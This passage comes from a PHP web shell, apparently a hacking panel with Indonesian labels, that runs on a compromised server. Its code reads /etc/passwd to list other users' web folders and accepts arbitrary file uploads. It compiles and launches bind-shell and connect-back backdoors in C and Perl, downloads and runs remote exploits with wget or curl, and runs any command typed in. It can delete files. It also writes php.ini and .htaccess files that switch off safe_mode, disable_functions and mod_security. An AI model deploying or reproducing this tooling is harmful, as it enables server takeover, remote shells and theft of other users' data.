    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>User :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Pass :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Info 
	Security</strong></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?
}
/////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jumping" method="post">

<?php 
	echo "<table class=\"cmdbox\"><tr>
	<td colspan=\"2\">"; 
	($sm = ini_get('safe_mode') == 0) ? 
	$sm = 'off': die("Error: Safe_mode = On</td></tr></table>  </div>"); 
	set_time_limit(0); 
	@$passwd = fopen('/etc/passwd','r'); 
	if (!$passwd) { die ("[-] jancookkk gak iso di jumping :D</td></tr></div>"); } 
	$pub = array(); $users = array(); 
	$conf = array(); $i = 0; 
	while(!feof($passwd)){ $str = fgets($passwd); 
	if ($i > 100){ $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')){ if (is_readable($dirz)){ array_push($users,$username); array_push($pub,$dirz); } } } $i++; } foreach ($users as $user){ echo '[Jebrett  !] <a href="?y=/home/'.$user.'/public_html">/home/'.$user.'/public_html/</a><br>'; } 
	 }
   // fungsi upload
elseif(isset($_GET['x']) && ($_GET['x'] == 'cr00t')){ 
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cr00t" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:red;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" readonly>
<?php
if(isset($_POST['submitcmd'])) {
	echo @exe($_POST['cmd']);
}
?>
</textarea>
<tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table>
</form>
<?php } 
else { 
if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	@unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
	@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd.$_GET['mkdir'];
	@mkdir($path);
}
	$buff = showdir($pwd,$prompt);
	echo $buff;
}
?>
<br><input class=inputzbut align=left type=submit name=ini value="Bypass Disable Functions and Safemode" />
<?php
if(isset($_POST['ini']))
	{
		
$byphp = "safe_mode = Off
disable_functions = None
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
$byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
file_put_contents("php.ini",$byphp);
file_put_contents(".htaccess",$byht);
echo "<script>alert('Disable Functions and Safemode Created'); hideAll();</script>";
die();}
?>

</script>
</div>
</body>
</html>
